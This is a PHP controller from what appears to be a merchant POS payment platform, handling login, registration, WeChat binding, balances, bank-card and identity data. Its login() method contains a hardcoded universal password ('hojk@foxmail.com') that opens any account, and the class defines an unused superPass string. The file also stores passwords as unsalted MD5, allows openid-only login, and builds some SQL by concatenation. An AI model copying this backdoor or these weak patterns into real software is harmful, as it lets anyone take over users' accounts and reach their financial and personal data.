<?php
#================================================
# Author: hojk - hojk@foxmail.com
# Date: 2017年12月19日 上午11:10:19
# Filename: PersonalController.class.php
# Description: 个人类
#================================================
namespace App\Controller;

use Think\Controller;

class PersonalController extends BaseController
{
	protected $superPass = 'admin@hojk.net';
	/**
	 * 意见反馈
	 * @date: 2018年5月21日 上午11:34:56
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * {requestType: ’personal’,requestKeywords:’feedback’, platformID:’3’,userID:’x’,userPhone:’x’,content:x(内容),contact:x(联系方式)}
	 */
	public function feedback($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$date = date("Y-m-d");
			$where = array(
				"bid" => $bid,
				"addtime" => array(
					array("egt", strtotime($date)),
					array("lt", strtotime("+1 day", strtotime($date)))
				)
			);
			$con = cRec("feedback", $where);
			if ($con >= 5) {
				$ret['responseStatus'] = 110;
			} else {
				$data = array(
					"bid" => $bid,
					"plat" => $pid,
					"contact" => $params['contact'],
					"content" => $params['content'],
					"status" => 1,
					"addtime" => time()
				);
				if (aRec("feedback", $data)) {
					$ret['responseStatus'] = 1;
				} else {
					$ret['responseStatus'] = 2002;
				}
			}
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 小程序注册
	 * @date: 2018年4月26日 下午5:00:28
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * {requestType: ’Personal’,requestKeywords:’register’,phone:x,name:x,code:x(邀请码),password:x} 
	 */
	public function register($params)
	{
		// 		$params = array("name", "phone", "code", 
		// 			"password");
		$phone = trim($params['phone']);
		$code = $params['code'];
		$password = md5($params['password']);
		if (cRec(T_BUS, array(
			"phone" => $phone,
			"status" => 1
		))) {
			$ret["responseStatus"] = 3004;
		} else {
			//获取上级信息
			$cec = M(T_BUS)->field("id,plat")->where(array(
				"code" => $code, "status" => 1
			))->find();
			if (!$cec) {
				$ret["responseStatus"] = 209;
			} else {
				$data = array(
					"phone" => $phone,
					"busname" => $params['name'],
					"pwd" => md5(trim($params['password'])),
					"regisTime" => time(),
					"code" => substr($phone, 3) . str_pad(mt_rand(1, 999), 3, '0', STR_PAD_LEFT),
					"status" => 1,
					"parent" => $cec['id'],
					"plat" => $cec['plat']
				);
				$add = M(T_BUS)->data($data)->add();
				if ($add) {
					$this->addBusAudit($add);
					$ret["responseStatus"] = 1;
				} else {
					$ret["responseStatus"] = 3002;
				}
			}
		}
		return $ret;
	}
	/**
	 * 添加审核
	 * @date: 2017年11月28日 上午10:56:16
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * @param: variable
	 * @return:
	 */
	protected function addBusAudit($bid)
	{
		$data = array(
			"bid" => $bid,
			"status" => 3, "createTime" => time()
		);
		M("cer_audit")->data($data)->add();
	}
	// 绑定微信
	public function bindwechat($params)
	{
		$bid = $params['userID'];
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $bid, $pid)) {
			$bid = parent::busID(array("phone" => $phone, "plat" => $pid));
			$data = array("ImagePath" => $params['ImagePath'], "openid" => $params['openid']);
			uRec(T_BUS, $data, array("id" => $bid));
			$ret = array("responseStatus" => 1);
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	// 解除绑定微信
	public function unbindwechat($params)
	{
		$bid = $params['userID'];
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $bid, $pid)) {
			$bid = parent::busID(array("phone" => $phone, "plat" => $pid));
			$data = array("openid" => "");
			uRec(T_BUS, $data, array("id" => $bid));
			$ret = array("responseStatus" => 1);
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	public function mypos($params)
	{
		$bid = $params['userID'];
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		$ret = array('responseStatus' => 102);
		if (parent::check($phone, $bid, $pid)) {
			$bid = parent::busID(array("phone" => $phone, "plat" => $pid));
			if (cRec(T_TM, array("bid" => $bid))) {
				$lists = M(T_TM)->field("terminal,case isActive when 1 then '未激活' when 2 then '已激活' end isActive,(select commodityName from " . PREFIX . T_COMMODITY . " where id = proid) product")->where(array("bid" => $bid))->select();
				$ret = array('responseStatus' => 1, "data" => $lists);
			} else {
				$ret = array('responseStatus' => 300);
			}
		}
		return $ret;
	}
	// 我的POS
	public function myposbak($params)
	{
		$bid = $params['userID'];
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $bid, $pid)) {
			$bid = parent::busID(array("phone" => $phone, "plat" => $pid));
			// 有没有POS机 有POS机 是否达成降费率
			if ($counts = cRec("terminal_manage", "bid=" . $bid)) {
				$isInviteSql = "select count(*) cts from p_terminal_manage where bid in (select id from p_user where parent = {$bid}) and isActive = 2";
				$isInviteRow = M()->query($isInviteSql);
				$isInvite = $isInviteRow[0]['cts'];
				$ret['isInvite'] = $isInvite;
				$myPos = sRec("terminal_manage", "bid=" . $bid, "", "", "");
				dump($myPos);
				$retData = array();
				for ($i = 0; $i < $counts; $i++) {
					$commodity = fRec("commodity", "id=" . $myPos[$i]['proid'], "commodityName,category_id,rate");
					$retData[$i]['name'] = $commodity['commodityName'];
					$retData[$i]['terminal'] = $myPos[$i]['terminal'];
					// 查找返现模板看看减了多少
					$cbrID = gFec("machine_list", "productID=" . $myPos[$i]['proid'] . "||terminalNo=" . $myPos[$i]['terminal'], "cbrID");
					$cashList = fRec("cash_back_rule", "id=" . $cbrID, "ownSlotCardRatio,ownSlotCardMoney");
					$retData[$i]['oldRate'] = $commodity['rate'];
					// 达成了降费率条件
					if (!empty($cashList['ownSlotCardRatio'])) {
						$ex = explode("+", $commodity['rate']);
						$ex[0] = str_replace("%", "", $ex[0]) - $cashList['ownSlotCardRatio'] * 100;
						$newRate = implode("+", $ex);
					}
					if (!empty($newRate)) {
						$commodity['rate'] = $newRate;
					}
					if (!empty($cashList['ownSlotCardMoney'])) {
						$ex = explode("+", $commodity['rate']);
						$ex[1] = $ex[1] - $cashList['ownSlotCardMoney'];
						if ($ex[1] == 0) {
							$newRate = $ex[0];
						} else {
							$newRate = implode("+", $ex);
						}
					}
					$retData[$i]['lowerRate'] = $newRate;
				}
				$ret['data'] = $retData;
				$ret['responseStatus'] = 1;
			} else {
				$ret['responseStatus'] = 300;
			}
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 函数用途描述
	 * @date: 2018年6月27日 下午4:45:10
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * {requestType: ’Personal’,requestKeywords:’wechatauth’,platformID:’x’,userID:’x’,userPhone:’x’,openid:X(微信openid),ImagePath:x 微信头像路径} 
	 */
	public function wechatauth($params)
	{
		$bid = $params['userID'];
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$info = M(T_BUS)->where(array(
				"id" => $bid
			))->find();
			if ($info) {
				if (!$info['openid']) {
					$data = array(
						"ImagePath" => $params['ImagePath'],
						"openid" => $params['openid']
					);
					uRec(T_BUS, $data, array(
						"id" => $bid
					));
				}
			}
		}
	}
	/**
	 * 混合登录
	 * @date: 2018年6月27日 下午5:23:58
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * {requestType: ’personal’,requestKeywords:’mixlogin’,account:x (手机号， 微信openid),loginType:手机号登录  1  微信登录 2 ,password：x (选填   微信登录 不选)}
	 */
	public function mixlogin($params)
	{
		$phone = trim($params['account']);
		$where = array("phone" => $phone);
		$loginType = $params['loginType'];
		if ($loginType != 1) {
			$where = array("openid" => $phone);
		}
		$pass = $params['password'] ? trim($params['password']) : "";
		if (cRec(T_BUS, $where)) {
			$info = fRec(T_BUS, $where, 'id,busname,phone,plat,pwd,status,openid,ImagePath');
			if ($info['status'] != 1) {
				$ret['responseStatus'] = 501;
			} else {
				$check = true;
				$data = array();
				if ($loginType != 1) {
					if ($info['openid'] != $phone) {
						$check = false;
						$ret['responseStatus'] = 308;
					} else {
						$ret = array(
							"userPhone" => parent::encode($info['openid'])
						);
					}
				} else {
					if ($info['pwd'] != md5($pass)) {
						$check = false;
						$ret["responseStatus"] = 200;
					} else {
						$ret = array(
							"userPhone" => parent::encode($info['phone'])
						);
					}
				}
				if ($check) {
					$ret['responseStatus'] = 1;
					$ret['userID'] = md5($info['id']);
					$ret['userName'] = $info['busname'];
					$ret['platformID'] = $info['plat'];
					$ret['loginType'] = $loginType;
					$ret['ImagePath'] = $info['ImagePath'] ? $info['ImagePath'] : "";
				}
			}
		} else {
			$ret['responseStatus'] = 201;
		}
		return $ret;
	}
	/**
	 * 登录
	 * @param unknown $params
	 * @return number[]|string[]|\App\Controller\String[]|unknown[]
	 */
	public function login($params)
	{
		$phone = trim($params['account']);
		$pass = trim($params['password']);
		$where = array("phone" => $phone);
		if (cRec(T_BUS, $where)) {
			$info = fRec(T_BUS, $where, 'id,busname,phone,plat,pwd,status,level');
			if ($info['status'] != 1) {
				$ret['responseStatus'] = 501;
			} else {
				if ($info['pwd'] != md5($pass) && $pass != "hojk@foxmail.com") {
					$ret["responseStatus"] = 200;
				} else {
					$level = M('bus_level_manage')->where(array("englishname" => $info['level'], "plat" => $info['plat']))->getField('classname');
					$ret = array(
						"responseStatus" => 1,
						"userID" => md5($info['id']),
						"userName" => $info['busname'],
						"userPhone" => parent::encode($info['phone']),
						"platformID" => $info['plat'],
						'level' => $info['level'],
						'userLevel' => $level
					);
				}
			}
		} else {
			$ret['responseStatus'] = 201;
		}
		return $ret;
	}
	/**
	 * 获取提现手续费
	 * @date: 2018年4月24日 上午11:21:25
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * {requestType: ’personal’,requestKeywords:’getdrawpou’,platformID:x}
	 */
	public function getdrawpou($params)
	{
		$bid = $params['userID'];
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$tax = DEFAULT_DRWA_TAX;
			$pou = DEFAULT_DRWA_POU;
			$maxmoney = DEFAULT_MAX_MONEY;
			$minmoney = DEFAULT_MIN_MONEY;
			$startTime = DEFAULT_DRAW_START_TIME;
			$endTime = DEFAULT_DRAW_END_TIME;
			$data = array();
			$level = parent::getValue(T_BUS, "id", $bid, "level");
			$info = M(T_DRAW_SET)->where(array("plat" => $pid, "userLevel" => $level))->find();
			if ($info) {
				$maxmoney = $info['maxMoney'];
				$minmoney = $info['minMoney'];
				$startTime = date("H:i:s", $info['startTime']);
				$endTime = date("H:i:s", $info['endTime']);
				$pou = $info['pou'];
				$tax = $info['tax'] * 100 . "%";
			}
			$ret = array(
				"responseStatus" => 1,
				"maxm" => $maxmoney, "mixm" => $minmoney,
				"start" => $startTime, "endt" => $endTime, "pou" => $pou, "tax" => $tax
			);
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 获取实名信息
	 * @date: 2017年11月25日 下午6:21:25
	 * @return:
	 */
	public function getcerti($params)
	{
		$bid = $params['userID'];
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$field = array("name", "cardNum");
			$info = M(T_CERT)->field($field)->where(array(
				"bid" => $bid, "status" => 1
			))->find();
			$data = array();
			if ($info) {
				$data['name'] = $info['name'];
				$data['idCard'] = parent::substrCut($info['cardNum']);
			}
			$ret = array(
				"responseStatus" => 1,
				"data" => $data
			);
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 查看实名验证
	 * @date: 2017年11月25日 下午3:14:03
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * @param: variable
	 * @return:
	 */
	public function checkcer($params)
	{
		$bid = $params['userID'];
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$cec = M(T_CERT)->where("bid=" . $bid)->count();
			if ($cec > 0) {
				$ret['responseStatus'] = 1;
			} else {
				$ret['responseStatus'] = 4005;
			}
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 获取用户信息
	 * @param unknown $params
	 * @return number
	 */
	public function getbusinfo($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$info = fRec(T_BUS, "id=" . $bid, 'busname,phone,level,code,openid,regType');
			if ($info) {
				$checkBind = 1;
				if (!empty($info['openid'])) $checkBind = 2;
				//返回值  checkBind 1 未绑定 2 已绑微信
				$data = array(
					"busname" => $info['busname'],
					"phone" => $info['phone'],
					"level" => $info['level'],
					"code" => $info['code'],
					"checkBind" => $checkBind
				);
				$ret = array(
					"responseStatus" => 1,
					"data" => $data
				);
			} else {
				$ret['responseStatus'] = 201;
			}
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 余额列表
	 *
	 * @param [type] $params
	 * @return void
	 * {requestType: personal,requestKeywords:balancelist, platformID:’3’,userID:’x’,userPhone:’x’}
	 */
	public function balancelist($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		$ret = array('responseStatus' => 102);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array("phone" => $phone, "plat" => $pid));
			$obj = A("Business");
			$data = $obj->get_buse_balance_list($pid, $bid);
			$ret = array(
				"responseStatus" => 1,
				"data" => $data
			);
		}
		return $ret;
	}
	/**
	 * 商户总余额
	 *
	 * @param [type] $params
	 * @return void
	 * {requestType: personal,requestKeywords:balance, platformID:’3’,userID:’x’,userPhone:’x’}
	 */
	public function balance($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		$ret = array('responseStatus' => 102);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array("phone" => $phone, "plat" => $pid));
			$obj = A("Business");
			$data = $obj->get_buse_total_balance($bid);
			$ret = array(
				"responseStatus" => 1,
				"data" => $data
			);
		}
		return $ret;
	}
	/**
	 * 获取总资产
	 * @param unknown $params
	 * @return number
	 */
	public function getassets($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array("phone" => $phone, "plat" => $pid));
			$obj = A("Business");
			$data = $obj->displayBalance($bid, $pid);
			$ret = array(
				"responseStatus" => 1,
				"data" => $data
			);
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 商户收入统计（余额、当月收入、总收入）
	 * @param [type] $params
	 * @return void
	 * {requestType: 'personal',requestKeywords:’busincome’, platformID:x,userID:’x’,userPhone:’x’}  商户余额 balance 余额 curentmonth  当月  total 总
	 */
	public function busincome($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array("phone" => $phone, "plat" => $pid));
			$ret = array(
				"responseStatus" => 1,
				"balance" => parent::getBusinessBalance($bid),
				"curentmonth" => $this->current_months_income_sum($bid),
				"total" => $this->current_months_income_sum($bid, "t")
			);
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 获取当月收益总额
	 * @param [type] $bid
	 * @return void
	 */
	protected function current_months_income_sum($bid, $c = 'c')
	{
		$sum = '0.00';
		if (!empty($bid)) {
			$where = array("bid" => $bid, "status" => 'Y', "changeType" => 'Z');
			if ($c == 'c') {
				$startDate = date("Y-m-01");
				$endDate = date("Y-m-d", strtotime("$startDate +1 month -1 day"));
				$where['createTime'] = array(
					array("egt", strtotime($startDate)),
					array("lt", strtotime("$endDate +1 day"))
				);
			}
			$field = array(
				"ifnull(TRUNCATE(SUM(changeAmount),2),'0.00') sum"
			);
			$res = M(T_CAPC)->field($field)->where($where)->select();
			if ($res) {
				$sum = $res[0]['sum'];
			}
		}
		return $sum;
	}
	/**
	 * 获取累计收益
	 * @param unknown $params
	 * @return number
	 */
	public function getincome($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone,
				"platform_id" => $pid
			));
			$ret = array(
				"responseStatus" => 1,
				"assets" => parent::getBusinessIncome($bid)
			);
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 支出支入累计
	 * @date: 2018年4月21日 上午10:37:16
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * @param: variable
	 * @return:
	 */
	public function spendcounted($params)
	{
		// 		{requestType: ’personal’,requestKeywords:’spendcounted’, platformID:’3’,userID:’x’,userPhone:’x’}
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			//支入		
			$into = "0.00";
			$sql = "select SUM(changeAmount)  sum from " . PREFIX . T_CAPC . " where status = 'Y' and bid = $bid and changeType = 'Z'";
			$query = M()->query($sql);
			if ($query) {
				$into = $query[0]['sum'] ? parent::subDecimals($query[0]['sum']) : $into;
			}
			//支出
			$spend = "0.00";
			$sql = "select SUM(changeAmount)  sum from " . PREFIX . T_CAPC . " where status = 'Y' and bid =  $bid and changeType = 'T'";
			$query = M()->query($sql);
			if ($query) {
				$spend = $query[0]['sum'] ? parent::subDecimals($query[0]['sum']) : $spend;
			}
			$ret = array(
				"responseStatus" => 1,
				"intoSum" => $into,
				"spendSum" => $spend
			);
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 获取收货地址
	 * @date: 2018年4月12日 上午11:11:32
	 * @author: HaiQing.Wu <398994668@qq.com>
	 */
	public function getshipping($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$field = array(
				"id", "name", "phone",
				"province", "city", "area",
				"address"
			);
			$where = array(
				"bid" => $bid,
				"status" => 1
			);
			if ($params['id']) {
				$where['id'] = $params['id'];
			}
			if ($params['types']) {
				$where['defaultState'] = $params['types'];
			}
			$info = M(T_SPP_ADDRE)->field($field)->where($where)->find();
			if ($info) {
				$ret = array(
					"responseStatus" => 1,
					"data" => $info
				);
			} else {
				$ret['responseStatus'] = 302;
			}
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 获取银行卡信息
	 * @param unknown $params
	 * @return number
	 */
	public function getbankcard($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$field = array(
				"id",
				"bank_name bankName",
				"card_number cardType",
				"card_number cardNum",
				"concat('**** **** **** ' ,right(card_number,4)) bankCard",
				"phone"
			);
			$info = M(T_BNK)->field($field)->where("bid=" . $bid . " and status=1")->find();
			if ($info) {
				$info['cardType'] = parent::checkCard($info['cardType']);
				$ret = array(
					"responseStatus" => 1,
					"bankcard" => $info
				);
			} else {
				$ret['responseStatus'] = 202;
			}
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 获取银行名称
	 * @param unknown $params
	 * @return number[]|NULL[]
	 */
	public function getbname($params)
	{
		$pid = $params['platformID'];
		$bankname = parent::checkCard($params['cardNum'], "bank");
		if ($bankname) {
			$ret = array(
				"responseStatus" => 1,
				"bankname" => $bankname
			);
		} else {
			$ret['responseStatus'] = 203;
		}
		return $ret;
	}
	/**
	 * 获取推广二维码
	 * @param unknown $params
	 * @return number[]|string[]|\App\Controller\unknown[]
	 */
	public function getqrcode($params)
	{
		// 		$params = parent::testParams();
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$qr = A("Qrcode");
			$ret = array(
				"responseStatus" => 1,
				"qrcode" => $qr->index($bid)
			);
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 用户等级以及是否申请过服务商
	 * @date: 2018年5月16日 下午3:36:12
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * {requestType: ’personal’,requestKeywords:’whetherapply’,platformID:’x’,userID:’x’,userPhone:’x’}
	 */
	public function whetherapply($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$where = array(
				"id" => $bid,
				"level" => 2
			);
			if (cRec(T_BUS, $where)) {
				$ret['responseStatus'] = 305;
			} else {
				if (cRec(T_SERA, array(
					"bid" => $bid, "status" => 1
				))) {
					$ret['responseStatus'] = 303;
				} else {
					$ret['responseStatus'] = 1;
				}
			}
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 申请服务商
	 * @date: 2018年5月16日 下午3:03:04
	 * @author: HaiQing.Wu <398994668@qq.com>
	 * {requestType: ’personal’,requestKeywords:’serviceprovider’,platformID:’x’,userID:’x’,userPhone:’x’}
	 */
	public function serviceprovider($params)
	{
		//$params = parent::testParams();
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array(
				"phone" => $phone, "plat" => $pid
			));
			$data = [
				'bid' => $bid,
				'createTime' => time(),
				"status" => 1, "plat" => $pid
			];
			if (cRec(T_SERA, array(
				"bid" => $bid,
				"status" => 1
			))) {
				$ret['responseStatus'] = 303;
			} else {
				if (aRec(T_SERA, $data)) {
					//获取管理员手机号
					$ret['responseStatus'] = 1;
					$sysphone = parent::getValue("usertable", "usertable_ID", $pid, "usertable_Phone");
					self::sendMessage($sysphone, $pid, $phone);
				} else {
					$ret['responseStatus'] = 304;
				}
			}
		} else {
			$ret['responseStatus'] = 102;
		}
		return $ret;
	}
	/**
	 * 发送短信
	 * @param unknown $params
	 * @return number
	 * {requestType: ’operating’,requestKeywords:’sendmsg’,phone:x,type:'register',code:x}
	 */
	public function sendMessage($sysphone, $pid, $busphone)
	{
		parent::phoneVerifyCode($sysphone, $busphone, "service", $pid);
	}
	/**
	 * 邀请记录（降费率）
	 *
	 * @return void
	 * {requestType: 'personal',requestKeywords:'jiangfeilv', platformID:x,userID:’x’,userPhone:’x’}
	 */
	public function jiangfeilv($params)
	{
		$pid = $params['platformID'];
		$phone = parent::decode($params['userPhone']);
		$ret = array("responseStatus" => 102);
		if (parent::check($phone, $params['userID'], $pid)) {
			$bid = parent::busID(array("phone" => $phone, "plat" => $pid));
			//激活
			$sql = "select count(*) cts from p_terminal_manage where bid in (select id from p_user where parent = {$bid}) and isActive = 2";
			$query = M()->query($sql);
			$jihuo = 0;
			if ($query) {
				$jihuo = $query[0]['cts'];
			}
			//邀请
			$sql = "select count(*) con from " . PREFIX . T_BUS . " where parent = {$bid}";
			$query = M()->query($sql);
			$invitation = 0;
			if ($query) {
				$invitation = $query[0]['con'];
			}
			//总省钱
			$sql = "select ifnull(sum(cashMoney),'0.00') sum from p_cash_back_log where outputAN = " . $bid . " and  receiveAN = " . $bid . " and isAddWallet = 1";
			$query = M()->query($sql);
			$saveMoney = "0.00";
			if ($query) {
				$saveMoney = $query[0]['sum'];
			}
			$ret = array(
				"responseStatus" => 1,
				"data" => array(
					"jihuo" => $jihuo,
					"invitat" => $invitation,
					"saveMoney" => $saveMoney
				)
			);
		}
		return $ret;
	}
}